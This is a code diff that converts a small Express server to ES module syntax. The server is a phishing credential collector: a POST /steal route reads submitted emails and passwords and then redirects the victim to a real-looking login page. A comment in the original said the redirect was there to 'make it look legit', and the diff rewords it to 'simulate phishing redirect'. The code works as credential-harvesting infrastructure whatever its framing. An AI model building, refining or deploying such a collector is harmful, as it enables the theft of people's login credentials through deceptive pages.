@@ -1,13 +1,21 @@
-const express = require("express");
-const fs = require("fs");
-const path = require("path");
-const bodyParser = require("body-parser");
+// server.mjs or server.js if "type": "module" is in package.json
+
+import express from "express";
+import fs from "fs";
+import path from "path";
+import bodyParser from "body-parser";
+import { fileURLToPath } from "url";
+import { dirname } from "path";
+import handler from "./api/steal.js";
+
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = dirname(__filename);
 
 const app = express();
 const PORT = 3000;
 
 app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.static("public"));
+app.use(express.static(path.join(__dirname, "public")));
 
 app.post("/steal", (req, res) => {
   const { email, password } = req.body;
@@ -19,7 +27,7 @@ app.post("/steal", (req, res) => {
       return res.status(500).send("Error occurred.");
     }
 
-    res.redirect("https://example.com/login"); // redirect to make it look legit
+    res.redirect("https://example.com/login"); // simulate phishing redirect
   });
 });
 
